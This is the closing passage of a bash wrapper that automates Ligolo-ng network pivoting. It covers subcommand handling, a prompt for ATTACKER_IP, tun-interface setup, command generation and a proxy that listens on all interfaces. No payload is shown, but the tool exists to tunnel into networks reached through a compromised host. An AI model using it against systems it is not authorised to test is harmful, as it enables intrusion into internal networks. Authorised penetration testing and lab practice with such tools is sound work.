            HTTP_PORT=$(find_free_port 8080)
            check_ligolo_port
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            info "Starting proxy..."
            run_proxy
            ;;
        
        route)
            add_route "$2" "${3:-ligolo}"
            ;;
        
        interface|iface|tun)
            local num="${2:-1}"
            for ((i=1; i<=num; i++)); do
                setup_interface "$(get_interface_name $i)"
            done
            list_interfaces
            ;;
        
        pivot)
            show_pivot_guide
            ;;
        
        status)
            show_status
            ;;
        
        commands)
            [[ -f "$WORK_DIR/commands.txt" ]] && cat "$WORK_DIR/commands.txt" || error "Run setup first"
            ;;
        
        cleanup)
            cleanup
            ;;
        
        *)
            echo ""
            echo -e "${CYAN}========================================${NC}"
            echo -e "${WHITE}${BOLD}   LIGOLO-NG AUTOMATION v4.0${NC}"
            echo -e "${CYAN}========================================${NC}"
            echo ""
            
            local default_ip=$(get_default_ip)
            read -p "Enter your IP [$default_ip]: " input_ip
            ATTACKER_IP="${input_ip:-$default_ip}"
            
            if ! [[ "$ATTACKER_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                error "Invalid IP"
                exit 1
            fi
            
            check_ligolo_port
            HTTP_PORT=$(find_free_port 8080)
            
            echo ""
            info "Configuration:"
            echo -e "    IP:          ${GREEN}$ATTACKER_IP${NC}"
            echo -e "    Ligolo Port: ${GREEN}$LIGOLO_PORT${NC}"
            echo -e "    HTTP Port:   ${GREEN}$HTTP_PORT${NC}"
            echo ""
            
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            
            read -p "Start proxy now? [Y/n]: " choice
            if [[ ! "$choice" =~ ^[Nn]$ ]]; then
                info "Starting proxy..."
                run_proxy
            else
                info "To start: cd $WORK_DIR && ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
            fi
            ;;
    esac
}

main "$@"
